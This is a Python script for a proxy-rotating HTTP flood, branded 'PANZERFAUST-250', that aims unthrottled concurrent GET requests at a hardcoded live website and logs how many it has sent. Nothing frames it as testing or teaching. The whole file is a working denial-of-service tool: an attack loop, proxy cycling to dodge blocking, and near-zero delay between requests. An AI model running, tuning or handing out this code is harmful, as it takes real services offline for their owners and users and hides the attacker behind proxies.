import asyncio
import aiohttp
import sys
import signal
import time

# ================= CONFIG =================
TARGET = "https://sts-network.vercel.app/"  # CHANGE IF NEEDED
PROXY_FILE = "proxies.txt"
MAX_CONCURRENT = 100  # Concurrent requests at once
# ==========================================

running = True
total_sent = 0
total_responses = 0
last_status = 0
last_log = time.time()
proxy_list = []

# ================= LOAD PROXIES =================
def load_proxies():
    try:
        with open(PROXY_FILE, 'r') as f:
            lines = [line.strip() for line in f if line.strip()]
        return lines
    except:
        return []

# ================= SIMPLE REQUEST =================
async def send_one(session, proxy, semaphore):
    global total_sent, total_responses, last_status
    
    async with semaphore:
        total_sent += 1
        
        try:
            async with session.get(
                TARGET,
                proxy=proxy,
                timeout=aiohttp.ClientTimeout(total=5)
            ) as resp:
                total_responses += 1
                last_status = resp.status
                await resp.read()
                return resp.status
        except aiohttp.ClientError as e:
            last_status = 0
            return 0
        except:
            last_status = 0
            return 0

# ================= MAIN LOOP =================
async def attack_loop():
    global proxy_list, running
    
    # Load proxies
    proxy_list = load_proxies()
    if not proxy_list:
        print("[!] No proxies in proxies.txt")
        return
    
    print(f"[+] Loaded {len(proxy_list)} proxies")
    print(f"[+] Target: {TARGET}")
    print(f"[+] Sending...")
    
    # Create semaphore to limit concurrency
    semaphore = asyncio.Semaphore(MAX_CONCURRENT)
    
    # Create a session
    connector = aiohttp.TCPConnector(limit=0, force_close=True)
    
    async with aiohttp.ClientSession(connector=connector) as session:
        while running:
            # Pick random proxy
            proxy = proxy_list[total_sent % len(proxy_list)]
            
            # Send request
            asyncio.create_task(send_one(session, proxy, semaphore))
            
            # Control rate (small delay)
            await asyncio.sleep(0.001)

# ================= LOGGING =================
async def log_loop():
    global last_log
    
    while running:
        current = time.time()
        if current - last_log >= 10:
            last_log = current
            
            # Format: PANZERFAUST-250:(sent) ----> (last status)
            sent_str = f"{total_sent:,}"
            
            status_color = '\033[91m'  # red
            if last_status == 200:
                status_color = '\033[92m'  # green
            elif 200 <= last_status < 300:
                status_color = '\033[92m'
            elif 300 <= last_status < 400:
                status_color = '\033[93m'  # yellow
            
            status_text = str(last_status) if last_status != 0 else "BLOCKED"
            
            print(f"\033[96mPANZERFAUST-250\033[0m:\033[92m{sent_str}\033[0m ----> {status_color}{status_text}\033[0m")
        
        await asyncio.sleep(1)

# ================= MAIN =================
async def main():
    # Start both loops
    attack_task = asyncio.create_task(attack_loop())
    log_task = asyncio.create_task(log_loop())
    
    # Wait for either to finish
    await asyncio.wait([attack_task, log_task], 
                      return_when=asyncio.FIRST_COMPLETED)
    
    # Cancel remaining
    attack_task.cancel()
    log_task.cancel()

def signal_handler(sig, frame):
    global running
    running = False
    print(f"\n[!] Stopping...")

if __name__ == "__main__":
    signal.signal(signal.SIGINT, signal_handler)
    
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
    finally:
        print(f"\n[+] Total sent: {total_sent:,}")
        print(f"[+] Responses: {total_responses:,}")
        if total_sent > 0:
            print(f"[+] Success rate: {(total_responses/total_sent*100):.1f}%")
